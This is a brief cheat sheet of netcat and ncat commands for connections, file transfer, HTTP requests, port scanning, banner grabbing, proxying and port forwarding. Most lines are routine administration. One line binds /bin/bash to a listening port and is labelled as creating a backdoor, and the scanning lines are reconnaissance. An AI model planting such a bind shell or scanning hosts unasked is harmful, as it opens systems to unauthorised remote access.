### Netcat

### Establish a Connection

$ nc -l 1234 —> listen on one console
$ nc localhost 1234 —> establish connection on another console
- Type `test` on second console to test

### Transfer Data

$ nc -l 1234 > output.file
$ nc localhost < input.file

### Talking to Servers
$ sudo printf "GET / HTTP/1.0\r\n\r\n" | nc host.example.com 80

### Port Scanning
$ sudo nc -zv host.example.com 1-1000

### Retrieve Banners and Versions
$ sudo echo "QUIT" | nc host.example.com 20-30

### Examples
$ sudo nc -p 31337 -w 5 host.example.com 42 —> source port 31337 and wait 5 second to establish connection on port 42 on host.example.com
$ sudo nc -u host.example.com 53 —> UDP
$ sudo nc -s 10.1.2.3 host.example.com 42 —> source is 10.1.2.3

——

# nc webserver.com 80
- GET /HTTL/1.1

$ ncat -v -u {host-ip} {udp-port} —> test remote UDP port

$ ncat -l 8080 | ncat 192.168.1.200 80 —> one directional proxy
$ mkfifo 2way
$ ncat -l 8080 0<2way | ncat 192.168.1.200 80 1>2way —> two way directional

$ ncat -l 10000 -e /bin/bash —> execute bash on 10000 (create a backdoor)

$ ncat -u -l  80 -c  'ncat -u -l 8080' —> forward port

$ ncat -w 10 192.168.1.100 8080 —> connection will be terminated in 10 seconds

$ ncat -l -k 8080 —> keep listening after client is broken